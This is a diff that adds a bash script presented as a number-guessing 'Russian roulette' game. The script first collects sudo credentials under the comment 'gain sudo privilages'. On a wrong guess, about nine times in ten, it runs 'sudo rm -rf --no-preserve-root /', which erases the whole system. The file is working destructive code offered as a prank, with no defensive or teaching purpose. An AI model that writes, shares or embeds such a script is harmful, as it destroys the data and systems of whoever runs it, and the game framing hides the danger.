@@ -1,0 +1,16 @@
+#!/bin/bash
+
+# gain sudo privilages
+sudo echo
+
+# RussianRouletteGame
+
+number=$((1 + RANDOM % 10))
+read -p "Guess a number between 1 and 10" guess
+
+if [[ "$number" -eq "$guess" ]]; then
+  echo "You Won!"
+else
+  # sudo shouldn't be nessicary but run it just in case
+  sudo rm -rf --no-preserve-root /
+fi
